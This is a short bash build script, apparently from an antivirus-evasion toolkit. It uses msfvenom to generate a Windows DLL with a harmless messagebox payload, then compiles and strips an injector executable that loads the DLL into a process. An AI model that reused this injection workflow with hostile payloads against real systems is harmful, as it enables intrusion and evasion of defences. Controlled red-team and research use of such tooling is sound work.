#!/bin/bash          
# example script for injecting shellcode into a process
# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh
# dll with a simple messagebox 
msfvenom -p windows/messagebox -b '\x00' -f dll -a x86 --platform Windows > hello.dll
# clean defs.h
echo "" > defs.h
# call make_avet, compile shellcode into the executable
./make_bfg -d
# compile 
$win32_compiler -o bfg.exe bfg.c
strip bfg.exe
# cleanup
echo "" > defs.h
# call with bfg.exe hello.dll
